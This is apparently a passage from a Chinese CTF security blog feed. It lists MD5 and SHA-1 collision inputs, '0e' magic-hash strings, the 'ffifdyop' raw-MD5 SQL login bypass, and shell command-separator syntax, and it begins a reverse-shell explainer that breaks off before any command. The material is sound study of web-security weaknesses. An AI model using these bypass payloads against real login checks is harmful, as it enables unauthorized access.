class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%<span class="hljs-number">5</span>f%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%f3%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%e9%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">13</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%a8%<span class="hljs-number">1</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%<span class="hljs-number">39</span>%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>● md5_2=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br></code></pre></td></tr></table></figure><h3 id="MD5值相等的字符串"><a href="#MD5值相等的字符串" class="headerlink" title="MD5值相等的字符串"></a>MD5值相等的字符串</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">●  %<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">00</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2 <br>●  %<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">02</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%d5%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2  <br></code></pre></td></tr></table></figure><h3 id="MD5值为0e开头的字符"><a href="#MD5值为0e开头的字符" class="headerlink" title="MD5值为0e开头的字符"></a>MD5值为0e开头的字符</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br><span class="hljs-number">240610708</span>：<span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span><br>QLTHNDT：<span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span><br>QNKCDZO：<span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br>PJNPDWY：<span class="hljs-number">0</span>e2915290528947027745<span class="hljs-number">57631701704</span><br>NWWKITQ：<span class="hljs-number">0</span>e7630820709760383476<span class="hljs-number">57360817689</span><br>NOOPCJF：<span class="hljs-number">0</span>e818888003657176127<span class="hljs-number">862245791911</span><br>MMHUWUV：<span class="hljs-number">0</span>e701732711630150438<span class="hljs-number">129209816536</span><br>MAUXXQC：<span class="hljs-number">0</span>e4784784668484390404<span class="hljs-number">34801845361</span><br></code></pre></td></tr></table></figure><h3 id="sha1值相等的字符串"><a href="#sha1值相等的字符串" class="headerlink" title="sha1值相等的字符串"></a>sha1值相等的字符串</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">● array1=%<span class="hljs-number">25</span>PDF-<span class="hljs-number">1.3</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">25</span>%E2%E3%CF%D3%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A1%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>obj%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C/Width%<span class="hljs-number">202</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Height%<span class="hljs-number">203</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Type%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Subtype%<span class="hljs-number">205</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Filter%<span class="hljs-number">206</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/ColorSpace%<span class="hljs-number">207</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Length%<span class="hljs-number">208</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/BitsPerComponent%<span class="hljs-number">208</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>Astream%<span class="hljs-number">0</span>A%FF%D8%FF%FE%<span class="hljs-number">00</span>%<span class="hljs-number">24</span>SHA-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>is%<span class="hljs-number">20</span>dead%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">85</span>/%EC%<span class="hljs-number">09</span>%<span class="hljs-number">239</span>u%<span class="hljs-number">9</span>C9%B1%A1%C6%<span class="hljs-number">3</span>CL%<span class="hljs-number">97</span>%E1%FF%FE%<span class="hljs-number">01</span>%<span class="hljs-number">7</span>FF%DC%<span class="hljs-number">93</span>%A6%B6%<span class="hljs-number">7</span>E%<span class="hljs-number">01</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">02</span>%<span class="hljs-number">9</span>A%AA%<span class="hljs-number">1</span>D%B2V%<span class="hljs-number">0</span>BE%CAg%D6%<span class="hljs-number">88</span>%C7%F8K%<span class="hljs-number">8</span>CLy%<span class="hljs-number">1</span>F%E0%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>D%F6%<span class="hljs-number">14</span>%F8m%B1i%<span class="hljs-number">09</span>%<span class="hljs-number">01</span>%C5kE%C1S%<span class="hljs-number">0</span>A%FE%DF%B7%<span class="hljs-number">608</span>%E9rr/%E7%ADr%<span class="hljs-number">8</span>F%<span class="hljs-number">0</span>EI%<span class="hljs-number">04</span>%E0F%C20W%<span class="hljs-number">0</span>F%E9%D4%<span class="hljs-number">13</span>%<span class="hljs-number">98</span>%AB%E1.%F5%BC%<span class="hljs-number">94</span>%<span class="hljs-number">2</span>B%E35B%A4%<span class="hljs-number">80</span>-%<span class="hljs-number">98</span>%B5%D7%<span class="hljs-number">0</span>F%<span class="hljs-number">2</span>A3.%C3%<span class="hljs-number">7</span>F%AC5%<span class="hljs-number">14</span>%E7M%DC%<span class="hljs-number">0</span>F%<span class="hljs-number">2</span>C%C1%A8t%CD%<span class="hljs-number">0</span>Cx0Z%<span class="hljs-number">21</span>Vda0%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%<span class="hljs-number">60</span>k%D0%BF%<span class="hljs-number">3</span>F%<span class="hljs-number">98</span>%CD%A8%<span class="hljs-number">04</span>F%<span class="hljs-number">29</span>%A1<br>● &amp;array2=%<span class="hljs-number">25</span>PDF-<span class="hljs-number">1.3</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">25</span>%E2%E3%CF%D3%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A1%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>obj%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C/Width%<span class="hljs-number">202</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Height%<span class="hljs-number">203</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Type%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Subtype%<span class="hljs-number">205</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Filter%<span class="hljs-number">206</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/ColorSpace%<span class="hljs-number">207</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Length%<span class="hljs-number">208</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/BitsPerComponent%<span class="hljs-number">208</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>Astream%<span class="hljs-number">0</span>A%FF%D8%FF%FE%<span class="hljs-number">00</span>%<span class="hljs-number">24</span>SHA-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>is%<span class="hljs-number">20</span>dead%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">85</span>/%EC%<span class="hljs-number">09</span>%<span class="hljs-number">239</span>u%<span class="hljs-number">9</span>C9%B1%A1%C6%<span class="hljs-number">3</span>CL%<span class="hljs-number">97</span>%E1%FF%FE%<span class="hljs-number">01</span>sF%DC%<span class="hljs-number">91</span>f%B6%<span class="hljs-number">7</span>E%<span class="hljs-number">11</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">02</span>%<span class="hljs-number">9</span>A%B6%<span class="hljs-number">21</span>%B2V%<span class="hljs-number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="hljs-number">5</span>B%A8Ly%<span class="hljs-number">03</span>%<span class="hljs-number">0</span>C%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>D%E2%<span class="hljs-number">18</span>%F8m%B3%A9%<span class="hljs-number">09</span>%<span class="hljs-number">01</span>%D5%DFE%C1O%<span class="hljs-number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="hljs-number">8</span>F%<span class="hljs-number">0</span>EE%BC%E0F%D2%<span class="hljs-number">3</span>CW%<span class="hljs-number">0</span>F%EB%<span class="hljs-number">14</span>%<span class="hljs-number">13</span>%<span class="hljs-number">98</span>%BBU.%F5%A0%A8%<span class="hljs-number">2</span>B%E31%FE%A4%<span class="hljs-number">807</span>%B8%B5%D7%<span class="hljs-number">1</span>F%<span class="hljs-number">0E3</span>.%DF%<span class="hljs-number">93</span>%AC5%<span class="hljs-number">00</span>%EBM%DC%<span class="hljs-number">0</span>D%EC%C1%A8dy%<span class="hljs-number">0</span>Cx%<span class="hljs-number">2</span>Cv%<span class="hljs-number">21</span>V%<span class="hljs-number">60</span>%DD0%<span class="hljs-number">97</span>%<span class="hljs-number">91</span>%D0k%D0%AF%<span class="hljs-number">3</span>F%<span class="hljs-number">98</span>%CD%A4%BCF%<span class="hljs-number">29</span>%B1<br></code></pre></td></tr></table></figure><p>使用ffifdyop万能密码绕过。ffifdyop的MD5加密结果是276f722736c95d99e921722cf9ed621c，经过MySQL编码后会变成<code>&#39;or&#39;6xxx</code>,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密。关键参数为md5(xx,true)。</p>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>符号</title>
    <link href="/2025/04/25/%E7%AC%A6%E5%8F%B7/"/>
    <url>/2025/04/25/%E7%AC%A6%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&amp;用于在同一命令行中依次执行多个命令，不管前面的命令执行是否成功，后面的命令都会继续执行<br>&amp;&amp;同样用于依次执行多个命令，但只有当前面的命令成功执行（返回退出码为 <span class="hljs-number">0</span>）时，后面的命令才会执行<br>|是管道符，将前一个命令的输出作为后一个命令的输入<br>||用于依次执行多个命令，只有当前面的命令执行失败（返回退出码不为 <span class="hljs-number">0</span>）时，后面的命令才会执行<br>;用于分隔多个命令使其按顺序依次执行，每个命令都会独立执行，不会影响到其他命令的执行<br>?匹配一个任意字符<br>*匹配<span class="hljs-number">0</span>个或多个任意字符，也就是可以匹配任何内容<br>[]匹配括号中任意一个字符<br>[-]匹配括号中任意一个字符，“-”代表范围<br>[^]逻辑非，表示匹配不是括号内的一个字符<br><span class="hljs-string">&#x27;&#x27;</span>单引号，在单引号中所有的特殊符号，如 <span class="hljs-variable">$ </span>和 `（反引号）都无特殊含义<br><span class="hljs-string">&quot;&quot;</span>双引号，在双引号中特殊符号都无特殊含义，但 <span class="hljs-variable">$ </span>、 ` （反引号）和 \ 是例外，拥有“调用变量值”,“引用命令”和“转义符”的特殊含义<br>`反引号：反引号括起来的内容是系统命令，在<span class="hljs-title class_">Bash</span>中先会执行它和()<br><span class="hljs-variable">$(</span>)和反引号作用相同，用来引用系统命令<br><span class="hljs-comment">#在shell脚本中,# 开头的行代表注释</span><br><span class="hljs-variable">$</span>用于调用变量的值，如需要调用变量 name 的值时，需要用 <span class="hljs-variable">$name</span> 的方式得到<br>\转义符，跟在\之后的特殊字符将失去特殊含义，变为普通字符<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反弹shell</title>
    <link href="/2025/04/25/%E5%8F%8D%E5%BC%B9shell/"/>
    <url>/2025/04/25/%E5%8F%8D%E5%BC%B9shell/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><p>反弹shell（Reverse Shell）是一种常见的攻击方式，通常用于远程控制目标系统。它与传统的“反向连接”（Reverse Connection）相似，通过允许目标系统主动连接回攻击者的机器，从而绕过防火墙或NAT（网络地址转换）等网络安全措施。</p><p>反弹 shell 是一种网络攻击技术，它允许攻击者在远程目标机器上执行一个命令，使得目标机器主动向攻击者的机器发起网络连接，将一个命令行 shell（如 bash、cmd 等）提供给攻击者，从而让攻击者能够控制目标机器的 shell，就好像直接在目标机器上操作一样。</p><h2 id="什么时候想要使用反弹shell"><a href="#什么时候想要使用反弹shell" class="headerlink" title="什么时候想要使用反弹shell"></a>什么时候想要使用反弹shell</h2><p>当我们在后续操作中需要使用到提权，或者命令执行失败，执行命令没有回显的时候，我们都需要想到使用反弹shell，以便我们进行后续的操作</p><p>反弹shell的前提是要有一个VPS</p><h2 id="反弹shell工作原理"><a href="#反弹shell工作原理" class="headerlink" title="反弹shell工作原理"></a>反弹shell工作原理</h2><p>通常情况下，我们会从本地计算机发起连接去访问远程服务器，这是正向连接，比如使用 SSH、HTTP 等协议。然而，在某些情况下，目标机器可能处于防火墙或网络地址转换（NAT）之后，外部无法直接访问，或者目标机器有严格的入站连接限制，这时正向连接就无法实现。</p><p>在传统的shell远程访问中，攻击者的机器通常会主动连接到目标机器上。反弹shell与之相反，反弹shell利用反向连接的概念，在目标机器上执行一个命令，该命令会主动向攻击者控制的服务器发起连接，目标机器主动连接到攻击者的机器，并向攻击者的机器发送一个shell（命令行接口）。攻击者通过这个shell可以绕过防火墙和NAT限制，从而可以执行命令、上传、下载文件等操作，实现对目标机器的远程控制。</p><h3 id="反弹shell具体步骤"><a href="#反弹shell具体步骤" class="headerlink" title="反弹shell具体步骤"></a>反弹shell具体步骤</h3><ul><li>攻击者：首先，攻击者启动一个监听程序（如 